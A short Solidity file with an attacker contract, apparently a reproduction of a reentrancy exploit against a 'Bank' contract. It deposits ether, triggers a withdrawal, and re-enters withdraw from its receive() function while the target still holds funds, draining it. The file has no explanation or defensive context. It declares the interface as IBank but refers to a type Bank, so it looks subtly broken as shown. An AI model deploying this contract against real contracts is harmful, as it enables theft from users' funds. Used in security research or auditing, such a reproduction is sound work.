interface IBank {
    function deposit() external payable;
    function withdraw(uint amount) external;
}

contract Reproduction {
    Bank public target;
    address public owner;

    constructor(address _target) {
        target = Bank(_target);
        owner = msg.sender;
    }

    function dodeposit() external payable {
        require(msg.value > 0);
        target.deposit{value: msg.value}();
    }

    function trigger(uint amount) external {
        require(msg.sender == owner);
        target.withdraw(amount);
    }

    receive() external payable {
        if (address(target).balance > 0) {
            target.withdraw(msg.value);
        }
    }
}